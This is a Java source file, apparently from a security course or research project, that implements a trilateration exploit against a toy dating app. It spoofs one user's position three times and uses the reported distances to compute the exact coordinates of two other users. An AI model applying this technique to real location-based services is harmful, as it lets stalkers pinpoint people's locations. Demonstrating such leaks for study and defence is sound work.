package trilateration;

import jif.lang.Principal;
import jif.principals.Bob;
import jif.principals.Chuck;
import project.DatingApp01;
import project.NodeAlice;

public class TrilaterationAppExploit {
	
	public class Position{
		public final double x;
		public final double y;
		public final double distance;
		
		Position(double x, double y, double distance){
			this.x = x;
			this.y = y;
			this.distance = distance;
		}
	}

	final static String phone = "Phone";
	final Position bobPosition;
	final Position chuckPosition;
	
	public TrilaterationAppExploit(DatingApp01 app) {
		Principal bob = Bob.getInstance();
		Principal chuck  = Chuck.getInstance();
		
		bobPosition = getPositionToPrinicpal(app, bob);
		chuckPosition = getPositionToPrinicpal(app, chuck);
	}
	
	private void drawDistance(Position pos, String name){
		System.out.println(name+" distance:"+pos.distance+ "  x:"+pos.x+ "  y:"+pos.y);
	}

	private Position getPositionToPrinicpal(DatingApp01 app, Principal principal){
		final int d = 1;
		final int zeroY = 0;
		final int zeroX = 0;
	
		Position firstReading = findDistanceToPrincipal(zeroX, zeroY, app,principal );
		Position secondReading = findDistanceToPrincipal(d, zeroY, app, principal );
		Position thirdReading = findDistanceToPrincipal(zeroX, d, app, principal );
		
		drawDistance(firstReading,principal.name()+" First reading: ");
		drawDistance(secondReading,principal.name()+" Second reading: ");
		drawDistance(thirdReading,principal.name()+" Third reading: ");
		System.out.println();
		
		double principalX = (firstReading.distance - secondReading.distance + d) / (2*d);
		double principalY = (firstReading.distance - thirdReading.distance + d) / (2*d);	
		return new Position(principalX, principalY, -1);
	}
	
	private Position findDistanceToPrincipal(double x, double y,DatingApp01 app, Principal principal){
		app.updateAlice(x, y, phone, 999);
		final NodeAlice nodeAlice = app.findAliceNeighbours(Double.MAX_VALUE);
		final double distance = getDistanceToPrincipalInAlice(nodeAlice,principal);
		return new Position(x, y, distance);
	}
	
	private static double getDistanceToPrincipalInAlice(NodeAlice nodeAlice, Principal principal){
		NodeAlice current = nodeAlice;
		while (current!=null){
			if (current.user == principal){
				return current.distance;
			} else {
				current = current.next;
			}	
		}
		return -1;
	}
	
	public double getBobX() {
		return bobPosition.x;
	}

	public double getBobY() {
		return bobPosition.y;
	}

	public double getChuckX() {
		return chuckPosition.x;
	}

	public double getChuckY() {
		return chuckPosition.y;
	}

}
